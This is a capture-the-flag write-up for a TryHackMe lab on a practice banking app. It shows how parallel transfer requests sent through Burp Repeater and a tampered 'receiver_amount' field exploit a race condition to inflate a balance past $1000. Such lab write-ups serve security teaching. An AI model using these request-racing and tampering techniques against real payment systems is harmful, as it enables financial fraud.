# TryHackMe: Race Conditions (Web) Write-Up

## Overview

This TryHackMe room explores **race conditions** in web applications, particularly **Time of Check to Time of Use (TOCTOU)** vulnerabilities. The goal was to exploit a vulnerable banking app and get any one user account above **\$1000** to retrieve the flag.

---

## Tools Used

* Burp Suite (Repeater with parallel request group)
* Web browser (via AttackBox)

---

## Recon and Initial Observations

Three users were provided, each with login credentials. Once inside the app, users could transfer funds to each other. A small fee was deducted on each transfer, and balances were displayed clearly.

I tested:

* Transfer mechanics
* Form data handling
* Backend behavior using Burp Suite

---

## Exploitation Phase 1: Race Condition

1. Captured a **valid transfer request** with Burp:

   ```
   POST /transfer/6282 HTTP/1.1
   fund_being_transferred: 1
   calculatedfee: 0.05
   receiver_amount: 0.95
   ```

2. Used **Burp Repeater** → “Send group (parallel)” with 20-50 identical POST requests.

3. Refreshed the receiver's dashboard: balance increased in unexpected increments like:

   ```
   $108.55000000000003
   $170.29999999999959
   ```

These strange floats revealed that **multiple requests were being accepted simultaneously**, exploiting a **TOCTOU race condition**.

---

## Exploitation Phase 2: Parameter Tampering

Curious, I tested mismatched values like:

```
fund_being_transferred: 1
receiver_amount: 10
```

Surprisingly, the backend **trusted the receiver’s amount blindly**.

I then launched 40 parallel requests with this structure.

**Result?**

```
$1342.99999999999989 USD
```

And the flag was revealed:

```
THM{****-***-****}
```

---

## Final Payload

```http
POST /transfer/6282 HTTP/1.1
fund_being_transferred: 1
receiver_amount: 10
calculatedfee: 0.05
```

💥 40 parallel requests = 400 fake dollars minted in seconds.

---

## Lessons Learned

* **Race conditions** can be subtle but powerful when exploited at scale
* **Parameter tampering** is still alive and well in poorly validated forms
* Always test both timing *and* logic separately: then together
* Sometimes, exploiting **both at once** (race + logic flaw) yields wild results

---

## Status: COMPLETED

Challenge completed with both a working exploit and a valuable real-world lesson in backend security validation.

*Write-up by [@emi-8](https://github.com/emi-8)*
